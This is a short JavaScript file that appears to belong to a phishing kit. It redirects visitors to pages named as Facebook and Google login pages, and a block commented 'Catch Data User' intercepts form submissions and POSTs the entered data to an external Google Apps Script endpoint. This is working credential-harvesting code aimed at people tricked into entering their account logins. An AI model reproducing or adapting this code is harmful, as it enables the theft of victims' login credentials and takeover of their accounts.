function fbLog() {
  window.location.href = "fb-log/facebook.html";
}

function ggLog() {
  window.location.href = "gg-log/google.html";
}

// Catch Data User
const scriptURL =
  "https://script.google.com/macros/s/AKfycby9srbt7vECeWaWPwOQ-G43vJh4udoQlWyUBLjQ-KMMBvcVaVqSHFzWKiF-FSqa3n4bOA/exec";
const form = document.forms["submit-to-google-sheet"];

form.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(scriptURL, { method: "POST", body: new FormData(form) })
    .then((response) => console.log("Success!", response))
    .catch((error) => console.error("Error!", error.message));
});
